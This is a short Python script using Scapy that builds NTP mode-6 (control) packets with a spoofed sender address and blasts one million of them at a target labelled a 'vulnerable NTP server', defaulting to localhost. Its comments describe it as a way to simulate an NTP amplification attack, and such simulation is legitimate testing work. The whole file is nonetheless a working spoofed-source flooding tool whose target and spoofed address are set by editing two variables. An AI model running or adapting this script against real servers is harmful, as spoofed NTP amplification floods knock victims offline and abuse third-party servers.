from scapy.all import *
from scapy.layers.ntp import NTP

# Short script for generating a bulk of custom NTP traffic.
# Configuration parameters are listed below and can be altered as seen fit:

##########################################################################################################

target_ip="127.0.0.1" # vulnerable NTP server
sender_ip="0.0.0.0"   # Spoofed IP address of the sender. Useful for simulation of amplification attack.
packet_amount=1000000   # Amount of packets sent.
packet_mode=6         # NTP packet mode. Useful for simulation of Control/Debug messages.

##########################################################################################################

pkt = (
    Ether()/
    IP(dst=target_ip,src=sender_ip)/
    UDP(sport=12345,dport=123)/
    NTP(
        mode=packet_mode
    )
)

sendpfast(pkt,count=packet_amount)